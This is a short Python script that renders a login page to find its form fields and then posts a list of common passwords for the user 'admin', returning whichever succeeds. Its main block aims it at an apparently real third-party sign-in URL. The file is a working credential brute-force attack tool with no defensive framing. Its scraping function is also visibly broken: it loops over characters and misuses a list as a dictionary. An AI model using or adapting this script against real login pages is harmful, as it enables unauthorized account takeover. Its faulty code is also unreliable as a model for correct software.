import time
import requests
from requests_html import HTMLSession
from bs4 import BeautifulSoup

import tools


def scrape(url: str):
    """Scrapes an URL for the user/email and password fields. Should return a list with two items (user/email and password)."""
    session = HTMLSession()
    request = session.get(url)
    request.html.render()
    html = request.html.html
    html = BeautifulSoup(html, features='lxml').prettify()
    
    actions = []
    hidden = {}
    fields = {'text': [], 'password': []}
    
    for line in html:
        if 'type="password"' in html:
            print(1)
        
        if tools.contains(line, ['<form ', 'action="']):
            actions.append(tools.grab(line, 'action="', '"'))
        
        if tools.contains(line, ['<input ', 'type="text"']):
            actions['text'].append(tools.grab(line, 'name="', '"'))

        if tools.contains(line, ['<input', 'type="password"']):
            actions['password'].append(tools.grab(line, 'name="', '"'))
            
    return {
        'actions': actions,
        'fields': fields,
        'hidden': hidden,
    }

def brute(url: str, login: str, passwords: list, fields: list, wait: int=0.1):
    for password in passwords:
        response = requests.post(url, data={fields[0]: login, fields[1]: password})
        print(response.status_code)
        if response.ok:
            return password
        time.sleep(wait)

if __name__ == '__main__':
    print(brute('https://login.demosphere.com/sign-in', login='admin', fields=['user', 'pass'], passwords=['hello', 'hello123', 'test', 'test123', 'admin', 'password']))